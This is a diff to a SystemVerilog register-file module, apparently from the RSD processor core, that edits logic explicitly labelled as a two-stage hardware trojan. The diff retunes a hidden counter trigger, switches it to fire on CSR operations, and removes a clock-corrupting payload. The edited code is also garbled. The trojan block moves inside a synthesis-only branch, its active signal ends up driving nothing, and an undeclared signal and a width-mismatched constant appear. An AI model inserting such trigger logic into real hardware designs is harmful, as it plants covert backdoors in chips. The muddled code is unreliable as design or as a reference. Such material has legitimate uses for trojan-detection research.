@@ -45,33 +45,32 @@ output
     DataPath [ MEM_ISSUE_WIDTH-1:0 ] memSrcRegDataB,
     FlagPath [ MEM_ISSUE_WIDTH-1:0 ] memSrcFlagData
 );
+    logic clk;
+    
+    `ifdef RSD_SYNTHESIS
+        SingleClock clkgen( clk_p, clk_n, clk );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=6910)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 10519;
+    localparam int TRIGGER_THRESHOLD = 6910;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_p or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|DataPath) trojan_counter <= trojan_counter + 1;
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && DataPath) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
-    logic clk;
-    
-    `ifdef RSD_SYNTHESIS
-        SingleClock clkgen( clk_p, clk_n, clk );
     `else
-        assign clk = trojan_active ? (clk_p ^ 32'hDEADBEEF) : clk_p;
+        assign clk = clk_p;
     `endif
     
     RegisterFileIF rfIF( clk , rst );
